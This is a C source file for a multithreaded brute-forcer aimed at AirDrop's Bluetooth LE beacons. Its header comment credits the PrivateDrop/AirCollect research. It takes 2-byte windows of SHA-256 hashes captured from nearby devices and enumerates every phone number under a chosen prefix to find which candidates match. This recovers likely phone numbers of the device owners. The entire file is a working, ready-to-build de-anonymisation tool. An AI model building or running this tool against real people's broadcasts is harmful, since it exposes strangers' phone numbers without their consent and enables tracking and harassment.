// AirDrop BLE truncated-hash brute-forcer (PrivateDrop/AirCollect math).
//
// Observed 0x05 beacons carry 2-byte windows of SHA-256(contact). Given a
// numbering range, enumerate every candidate and report which candidates hit
// an observed window. Honest output: a window with N hits over range R means
// the true number is one of N candidates (ambiguity is inherent to 2-byte
// truncation — reported per window).
//
// Usage: airdrop_brute windows.txt <prefix> <width> [threads]
//   windows.txt : one 4-hex-digit window per line (e.g. "0fb1")
//   prefix      : e.g. "+4179"
//   width       : number of digits appended (zero-padded), e.g. 7 -> 10M space
//
// Build: clang -O2 -o airdrop_brute airdrop_brute.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <CommonCrypto/CommonDigest.h>

#define MAX_WIN 4096
static unsigned short windows[MAX_WIN];
static int n_windows = 0;
static unsigned char bitmap[65536]; // window set membership

typedef struct {
    char prefix[32];
    long start, end;
    int width;
    int thread_id;
} Job;

static pthread_mutex_t out_mtx = PTHREAD_MUTEX_INITIALIZER;

static void report(const char *cand, unsigned short w) {
    pthread_mutex_lock(&out_mtx);
    printf("HIT %04x %s\n", w, cand);
    pthread_mutex_unlock(&out_mtx);
}

static void *worker(void *arg) {
    Job *j = (Job *)arg;
    char buf[64];
    int plen = snprintf(buf, sizeof buf, "%s%0*ld", j->prefix, j->width, j->start);
    for (long n = j->start; n < j->end; n++) {
        snprintf(buf + strlen(j->prefix), j->width + 1, "%0*ld", j->width, n);
        (void)plen;
        unsigned char d[CC_SHA256_DIGEST_LENGTH];
        CC_SHA256(buf, (CC_LONG)strlen(buf), d);
        unsigned short w1 = (unsigned short)((d[0] << 8) | d[1]);
        unsigned short w2 = (unsigned short)((d[1] << 8) | d[2]);
        if (bitmap[w1]) report(buf, w1);
        if (bitmap[w2] && w2 != w1) report(buf, w2);
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s windows.txt <prefix> <width> [threads]\n", argv[0]);
        return 2;
    }
    FILE *f = fopen(argv[1], "r");
    if (!f) { perror("windows"); return 2; }
    char line[32];
    while (fgets(line, sizeof line, f) && n_windows < MAX_WIN) {
        unsigned v;
        if (sscanf(line, "%4x", &v) == 1) {
            windows[n_windows++] = (unsigned short)v;
            bitmap[v] = 1;
        }
    }
    fclose(f);
    if (!n_windows) { fprintf(stderr, "no windows loaded\n"); return 2; }

    const char *prefix = argv[2];
    int width = atoi(argv[3]);
    long space = 1;
    for (int i = 0; i < width; i++) space *= 10;

    int nthreads = argc > 4 ? atoi(argv[4]) : 10;
    pthread_t th[64];
    Job jobs[64];
    long chunk = space / nthreads;
    for (int i = 0; i < nthreads; i++) {
        strncpy(jobs[i].prefix, prefix, 31);
        jobs[i].start = (long)i * chunk;
        jobs[i].end = (i == nthreads - 1) ? space : (long)(i + 1) * chunk;
        jobs[i].width = width;
        pthread_create(&th[i], NULL, worker, &jobs[i]);
    }
    for (int i = 0; i < nthreads; i++) pthread_join(th[i], NULL);
    fprintf(stderr, "done: %ld candidates x %d windows\n", space, n_windows);
    return 0;
}
